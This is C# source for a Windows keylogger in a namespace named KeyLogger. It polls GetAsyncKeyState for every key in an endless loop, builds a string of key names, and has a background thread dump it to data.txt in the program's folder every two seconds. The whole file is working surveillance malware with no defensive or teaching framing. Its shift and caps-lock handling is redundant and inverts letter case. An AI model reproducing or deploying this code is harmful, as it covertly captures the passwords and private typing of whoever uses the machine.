using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        string output = "";

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        private void Form1_Load(object sender, EventArgs e)
        {
            System.Threading.Thread safedata = new System.Threading.Thread(datasafe);
            safedata.Start();
            while (true)
            {
                System.Threading.Thread.Sleep(1);
                ReadInput();
                Application.DoEvents();
            }
        }

        public void datasafe()
        {
            while (true)
            {
                System.Threading.Thread.Sleep(2000);
                using (StreamWriter stream = File.CreateText(Application.StartupPath + @"\data.txt"))
                {
                    stream.WriteLine(output);
                    stream.Flush();
                }
            }
        }

        private void ReadInput()
        {
            try
            {
                foreach (int i in Enum.GetValues(typeof(Keys)))
                {
                    if (GetAsyncKeyState(i) == -32767)
                    {
                        string lshiftkey = "LShiftKey ";
                        string shiftkey = "ShiftKey ";
                        string data = Enum.GetName(typeof(Keys), i) + " ";

                        if (lshiftkey != data && shiftkey != data)
                        {
                            if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift || Control.IsKeyLocked(Keys.CapsLock))
                            {
                                if ((Control.ModifierKeys & Keys.Shift) == Keys.Shift || Control.IsKeyLocked(Keys.CapsLock))
                                {
                                    output += data.ToLower();
                                }
                                else
                                {
                                    output += data;
                                }
                            }
                            else
                            {
                                output += data.ToLower();
                            }
                        }
                    }
                }
            }
            catch
            {

            }
        }
    }
}
